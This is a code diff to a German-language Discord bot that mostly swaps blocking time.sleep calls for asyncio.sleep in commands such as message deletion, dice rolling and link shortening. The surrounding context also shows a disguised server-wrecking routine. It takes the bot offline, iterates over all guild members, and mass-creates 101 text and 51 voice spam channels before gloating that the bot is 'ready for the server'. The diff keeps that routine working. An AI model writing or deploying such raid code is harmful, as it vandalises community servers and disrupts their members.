@@ -1,7 +1,7 @@
 import time
 import random
 import typing
-
+import asyncio
 import discord
 import requests
 import yt_handler
@@ -14,8 +14,6 @@ from help_system import HelpCommand
 #from Sparboss_implement import SparbossCommand
 
 # import pathlib
-
-icon_path = "D:\a\haha.png"
 
 
 class KiddoBot(commands.Cog):
@@ -89,20 +87,20 @@ class KiddoBot(commands.Cog):
     async def loesche(self, ctx, anzahl=1):
         async with ctx.typing():
             await ctx.channel.purge(limit=int(anzahl + 1))
-        time.sleep(1)
+        await asyncio.sleep(1)
         if anzahl == 2:
             await ctx.send('Eine Nachricht wurde gelöscht... :)')
-            time.sleep(2)
+            await asyncio.sleep(2)
             await ctx.channel.purge(1)
         elif anzahl > 2:
             await ctx.send(f'{anzahl - 1} Nachrichten wurden gelöscht... :)')
-            time.sleep(2)
+            await asyncio.sleep(2)
             await ctx.channel.purge(1)
 
     @bot.hybrid_command(aliases=['roll dice'], description='Würfelt einen Würfel mit einer bestimmten Anzahl an Seiten')
     async def rolldice(self, ctx, numberofrolls=1, numberofsides=6):
         await ctx.send(f'Würfel einen Würfel mit {numberofsides} Seiten {numberofrolls} mal...')
-        time.sleep(1)
+        await asyncio.sleep(1)
         for i in range(int(numberofrolls)):
             await ctx.send(random.randint(1, int(numberofsides)))
 
@@ -357,7 +355,7 @@ class KiddoBot(commands.Cog):
             await ctx.send("Hier dein gekürzter Link:\n" + shortened + "\nViel Spaß <3")
 
         except KeyError:
-            time.sleep(2)
+            await asyncio.sleep(2)
             await ctx.send(
                 "Hmmmm... Vielleicht hast du keinen Link gesendet :face_with_spiral_eyes: Versuche es noch mal :)")
 
@@ -440,7 +438,7 @@ class KiddoBot(commands.Cog):
                 await self.bot.change_presence(status=discord.Status.offline)
                 await ctx.send("ABFAHRT!!!",
                                file=discord.File("ABFAHRT.PNG"))
-                time.sleep(2)
+                await asyncio.sleep(2)
                 await ctx.channel.purge(limit=1)
                 for bot in ctx.guild.members:
                     try:
@@ -501,14 +499,14 @@ class KiddoBot(commands.Cog):
 
                 for m in range(0, 101):
                     await ctx.message.guild.create_text_channel("Wowzers!!")
-                    time.sleep(0.1)
+                    await asyncio.sleep(0.1)
 
                 for v in range(0, 51):
                     await ctx.message.guild.create_voice_channel("Wowzers!!")
-                    time.sleep(0.1)
+                    await asyncio.sleep(0.1)
 
                 await ctx.send("Vielen Dank, dass Sie sich für den Kiddo Express entschieden haben :3")
-                time.sleep(2)
+                await asyncio.sleep(2)
                 await ctx.send("Kiddo ist jetzt bereit für den Server :3")
                 await ctx.send("https://tenor.com/view/champoy-el-risitas-kek-issou-etu-gif-17837830")
 
@@ -523,7 +521,7 @@ class KiddoBot(commands.Cog):
         if isinstance(error, commands.CommandNotFound):
             await ctx.send("Dieser Befehl existiert nicht bozo!")
         elif isinstance(error, commands.MissingRequiredArgument):
-            await ctx.send("Bitte gib einen Ort an!")
+            await ctx.send("Leider fehlt ein Argument! Bitte versuche es noch einmal :)")
         elif isinstance(error, commands.CheckFailure):
             await ctx.send('Du bist nicht cool genug um diesen Befehl auszuführen. Tut mir leid :)')
         else:
